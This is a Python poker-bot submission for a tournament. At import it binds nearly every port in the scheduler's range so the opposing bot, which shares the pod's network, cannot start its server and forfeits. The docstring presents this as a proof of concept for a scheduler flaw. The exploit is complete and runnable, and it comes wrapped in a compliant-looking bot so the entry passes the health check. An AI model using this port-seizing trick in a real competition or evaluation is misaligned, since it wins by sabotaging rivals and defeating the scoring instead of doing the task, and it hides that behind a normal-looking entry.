"""
agent.py - a heads-up poker bot submission.

As a POKER PLAYER this bot is deliberately weak: it only ever checks when a
check is free, and folds otherwise. On merit it would lose almost every match.

It wins anyway, because of WHERE the tournament runs it. The scheduler packs
both competing bots and the judge into ONE Kubernetes pod, so all three share
one network namespace (one `localhost`). The scheduler gives each bot a random
port in [20000, 60000) and starts the two bots as native sidecars, agent1
before agent2. This bot - as the first thing it does, before it even imports
its web framework - binds every port in that range except its own. The OTHER
bot then cannot bind the port its server needs ("address already in use"), so
it never answers the judge's health check and the judge scores it as a forfeit
(an automatic loss), no matter how well it would have played.

This is a proof of concept for the "both bots share the pod's network"
limitation noted in eval-infra/SCHEDULER.md. The fix is one bot per pod (its
own network namespace), not anything in this file.

Everything below the exploit is an ordinary, compliant submission.
"""

import os
import socket

# Must match eval-infra/scheduler.py PORT_RANGE.
PORT_LO, PORT_HI = 20000, 60000
MY_PORT = int(os.environ.get("PORT", "5008"))


# ===========================================================================
# THE EXPLOIT - runs at import time, before anything else, to win the race
# ===========================================================================
def _seize_ports(my_port: int) -> list:
    """Bind every port in the scheduler's range except our own.

    Done FIRST, before importing uvicorn/fastapi (which the victim must import
    before it can bind), and at full speed in the main thread, so we finish
    taking the range before the other bot's server gets to bind its port.
    We only bind (no listen): that is enough to make the victim's bind fail,
    and it is one fewer syscall per port, so the whole range goes faster.
    """
    try:
        import resource
        _soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))  # no root needed
    except Exception:
        pass

    held = []
    bind = socket.socket
    for port in range(PORT_LO, PORT_HI):
        if port == my_port:
            continue  # keep our own port free for our real server
        try:
            s = bind(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", port))
            held.append(s)
        except OSError:
            pass  # already taken or fd limit hit; keep going
    return held


# Seize the ports immediately, and keep the sockets alive for the whole process.
_HELD_PORTS = _seize_ports(MY_PORT)


# ===========================================================================
# ORDINARY (COMPLIANT) BOT - this part is a normal submission
# ===========================================================================
import uvicorn  # noqa: E402  (imported after the exploit, on purpose)
from fastapi import FastAPI, Request  # noqa: E402
from fastapi.responses import JSONResponse  # noqa: E402

PARTICIPANT = "practice-portsteal"
AGENT_NAME = "port-stealer"


def choose_action(obs: dict) -> str:
    """Check when it's free, otherwise fold. Always a legal action."""
    return "CHECK_CALL" if obs.get("to_call", 0) == 0 else "FOLD"


app = FastAPI()
STATUS = {"started": False}
TOKEN = os.environ.get("AGENT_TOKEN") or None


def _check(request: Request, path: str):
    """Token (and 'half started') check, done before reading the body."""
    if TOKEN and request.headers.get("x-agent-token") != TOKEN:
        return JSONResponse({"error": "bad or missing X-Agent-Token"}, status_code=401)
    if not STATUS["started"] and path != "/new-half":
        return JSONResponse({"error": "call /new-half first"}, status_code=409)
    return None


@app.get("/")
async def info():
    return {"participant": PARTICIPANT, "agent_name": AGENT_NAME}


@app.post("/new-half")
async def new_half(request: Request):
    refused = _check(request, "/new-half")
    if refused:
        return refused
    STATUS["started"] = True
    return {"ok": True}


@app.post("/act")
async def act(request: Request):
    refused = _check(request, "/act")
    if refused:
        return refused
    try:
        body = await request.json()
        obs = body["observation"]
    except Exception:
        return JSONResponse({"error": "bad request body"}, status_code=400)
    return {"action": choose_action(obs), "hand_end_errors": []}


@app.post("/hand-end")
async def hand_end(request: Request):
    refused = _check(request, "/hand-end")
    if refused:
        return refused
    return {"ok": True, "hand_end_errors": []}


if __name__ == "__main__":
    # The port range is already seized (at import). Now serve our own bot so we
    # pass the health check and the build smoke test and look like a real entry.
    uvicorn.run(app, host="0.0.0.0", port=MY_PORT, log_level="warning", access_log=False)
